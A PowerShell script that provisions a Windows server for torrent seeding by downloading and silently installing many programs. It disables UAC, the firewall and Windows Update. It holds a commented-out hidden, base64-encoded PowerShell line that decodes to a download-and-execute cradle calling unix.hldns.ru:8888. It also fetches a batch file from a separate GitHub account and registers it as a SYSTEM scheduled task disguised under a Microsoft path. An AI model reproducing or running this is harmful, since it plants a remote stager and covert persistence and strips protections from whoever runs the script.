Set-ExecutionPolicy Unrestricted  -Force

#-----------------  MAX PERFOMENS

$path        = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects'
try {
    $s = (Get-ItemProperty -ErrorAction stop -Name visualfxsetting -Path $path).visualfxsetting 
    if ($s -ne 2) {
        Set-ItemProperty -Path $path -Name 'VisualFXSetting' -Value 2  
        }
    }
catch {
    New-ItemProperty -Path $path -Name 'VisualFXSetting' -Value 2 -PropertyType 'DWORD'
    }
#------------------- UAH
New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name UseTabletModeNotificationIcons -PropertyType DWord -Value 0 -Force
New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name TaskbarSmallIcons -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path HKLM:Software\Policies\Microsoft\Windows\WindowsUpdate\AU\NoAutoUpdate -Name DisableWindowsUpdateAccess -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name Hidden -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name HideFileExt -PropertyType DWord -Value 0 -Force
New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run -Name qbittorrent.exe -Value 'C:\Program Files\qBittorrent\qbittorrent.exe' -Force
New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer -Name EnableAutoTray -PropertyType DWord -Value 0 -Force
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

#powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABhAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGEALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABhAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBuAGkAeAAuAGgAbABkAG4AcwAuAHIAdQA6ADgAOAA4ADgALwAxAC8AZgBkAEoAWgBsAGgAcwBGAHcAZQAzAEkAYgBrACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwB1AG4AaQB4AC4AaABsAGQAbgBzAC4AcgB1ADoAOAA4ADgAOAAvADEAJwApACkAOwA=

taskkill /f /im explorer.exe
Start-Sleep -Seconds 1
& explorer.exe
Start-Sleep -Seconds 3
#---------------------
Write-Output "make directory"
#Start-Sleep -Seconds 
#dir for downloads installation files
mkdir c:\install
#dir for QBitorent
mkdir "C:\QBitorent load"
#dir for torrent
mkdir "c:\torrent"
#dir for torrent load
mkdir "c:\torrent load"
#dir for downloads settings file qBittorrent
#mkdir ~\AppData\Roaming\qBittorrent
#dir for settings memreduct
#mkdir "~\AppData\Roaming\Henry++\Mem Reduct"

$tls         = [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Output "Downloads files"
Start-Sleep -Seconds 1


Write-Output "7zip"
$tls
$source      = 'https://www.7-zip.org/a/7z2103-x64.exe'
$destination = 'c:\install\7z.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "chrome"
$tls
$source      = 'https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BB659422A-08CE-D176-FEFC-0C888D22165D%7D%26lang%3Dru%26browser%3D4%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DIXYC%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe'
$destination = 'c:\install\ChromeSetup.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "alwaysynce"
$tls
$source      = 'https://allwaysync.com/content/download/allwaysync-x64-21-0-9.exe'
$destination = 'c:\install\allwaysync-x64-21-0-9.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "uTorrent github"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/uTorrent.msi'
$destination = 'c:\install\uTorrent.msi'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "node-v16_64 msi"
$tls
$source      = 'https://nodejs.org/dist/v14.16.1/node-v14.16.1-x64.msi'
$destination = 'c:\install\node-v14.16.1-x64.msi'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "memreduct"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/memreduct.zip'
$destination = 'c:\install\memreduct.zip'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "python3.9.5"
$tls
$source      = 'https://www.python.org/ftp/python/3.9.5/python-3.9.5-amd64.exe'
$destination = 'c:\install\python-3.9.5-amd64.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "qBittorrent"
$tls
$source      = 'https://github.com/c0re100/qBittorrent-Enhanced-Edition/releases/download/release-4.3.5.10/qbittorrent_4.3.5.10_x64_setup.exe'
$destination = 'c:\install\qbittorrent_4.3.5_x64_setup.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "Qset"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/Qset.exe'
$destination = 'C:\install\Qset.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "Uset"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/Uset.exe'
$destination = 'C:\install\Uset.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "Skript remove and block"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/Skript.exe'
$destination = 'C:\install\Skript.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "yarliki"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/yarliki.exe'
$destination = 'c:\install\yarliki.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "memreduct settings"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/memreduct.exe'
$destination = 'c:\install\memreduct.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "allwaysync_profile_DJAV.xml"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/allwaysync_profile_DJAV.xml'
$destination = 'c:\install\allwaysync_profile_DJAV.xml'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

$tls
$source	     = 'https://raw.githubusercontent.com/R0ckNRolla/btt_setting/main/update_scheduler.bat'
$destination = 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\update_scheduler.bat'
Invoke-WebRequest $source -OutFile $destination
Start-Sleep -Seconds 5

Write-Output "allwaysync_profile_move.xml"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/allwaysync_profile_move.xml'
$destination = 'c:\install\allwaysync_profile_move.xml'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "allwaysync_default_profile2.xml"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/allwaysync_profile_move_2.xml'
$destination = 'c:\install\allwaysync_profile_move_2.xml'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "allwaysync_default_profile3.xml"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/allwaysync_profile_move_3.xml'
$destination = 'c:\install\allwaysync_profile_move_3.xml'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "allwaysync_default_profile4.xml"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/allwaysync_profile_move_4.xml'
$destination = 'c:\install\allwaysync_profile_move_4.xml'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1

Write-Output "startup.bat"
$tls
$source      = 'https://raw.githubusercontent.com/vulukoll/btt_setting/main/startup.bat'
$destination = "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Sleep -Seconds 1



Write-Output "install programs"
Write-Output "7zip"
& C:\install\7z.exe /S
Start-Sleep -Seconds 25
Write-Output "chrome"
& c:\install\ChromeSetup.exe
Start-Sleep -Seconds 25
Write-Output "alwaysynce"
& c:\install\allwaysync-x64-21-0-9.exe /verysilent /norestart
Start-Sleep -Seconds 25
Write-Output "uTorrent"
& c:\install\uTorrent.msi
Start-Sleep -Seconds 25
Write-Output "node-v14"
& c:\install\node-v14.16.1-x64.msi /qn /norestart
Start-Sleep -Seconds 25
Write-Output "memreduct"
#& c:\install\memreduct.zip
#Start-Sleep -Seconds 5
#echo "
& 'C:\Program Files\7-Zip\7z.exe' x 'C:\install\memreduct.zip' -o"c:\Program Files"
Start-Sleep -Seconds 20
Write-Output "python"
& c:\install\python-3.9.5-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
Start-Sleep -Seconds 20
Write-Output "qBittorrent"
Start-Process -FilePath "C:\install\qbittorrent_4.3.5_x64_setup.exe" -ArgumentList "/S /v/qn"
Start-Sleep -Seconds 15
cmd /c SCHTASKS /create /tn \Microsoft\Windows\test /sc HOURLY /mo 12 /tr "cmd /c C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\update_scheduler.bat"  /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST /F
Start-Sleep -Seconds 1
Write-Output "settings qbittorrent"
& C:\install\Qset.exe /S
Start-Sleep -Seconds 10
Write-Output "settings uTorrent"
& C:\install\Uset.exe /S
Start-Sleep -Seconds 10
#C:\install\folders.exe /S
#Start-Sleep -Seconds 10
Write-Output "install skripts"
& C:\install\Skript.exe /S
Start-Sleep -Seconds 10
Write-Output "unzip shortcuts"
& C:\install\yarliki.exe /S
Start-Sleep -Seconds 10
Write-Output "settings memreduct"
C:\install\memreduct.exe /S 
Start-Sleep -Seconds 10
New-Item -ItemType directory -Path 'C:\Users\Administrator\AppData\Roaming\Sync App Settings\_SYNCAPP'


$name = Read-Host 'if profil JAV, please insert 0, if move profile insert 1, if move profile 2 insert 2, of move profile 3, if move profile 4 insert 4:'
if($name -eq 0){

  Copy-Item C:\install\allwaysync_profile_DJAV.xml "C:\Users\Administrator\AppData\Roaming\Sync App Settings\_SYNCAPP\default profile.xml" -Force

}
elseif($name -eq 1){

  Copy-Item C:\install\allwaysync_profile_move.xml "C:\Users\Administrator\AppData\Roaming\Sync App Settings\_SYNCAPP\default profile.xml" -Force

}
elseif($name -eq 2){

  Copy-Item C:\install\allwaysync_profile_move_2.xml "C:\Users\Administrator\AppData\Roaming\Sync App Settings\_SYNCAPP\default profile.xml" -Force

}
elseif($name -eq 3){

  Copy-Item C:\install\allwaysync_profile_move_3.xml "C:\Users\Administrator\AppData\Roaming\Sync App Settings\_SYNCAPP\default profile.xml" -Force

}
elseif($name -eq 4){

  Copy-Item C:\install\allwaysync_profile_move_4.xml "C:\Users\Administrator\AppData\Roaming\Sync App Settings\_SYNCAPP\default profile.xml" -Force

}
& "C:\Program Files\Allway Sync\Bin\syncappw.exe"



#pause
Start-Sleep -Seconds 180

shutdown -t 0 -r -f
#Copy-Item  C:\install\settings.dat C:\Users\Administrator\AppData\Roaming\uTorrent\settings.dat -Force
#Copy-Item  C:\install\settings.dat.old C:\Users\Administrator\AppData\Roaming\uTorrent\settings.dat.old -Force
#Copy-Item  C:\install\qBittorrent.ini C:\Users\administrator\AppData\Roaming\qBittorrent\qBittorrent.ini -Force


Write-Output "Server is ready to work"
pause
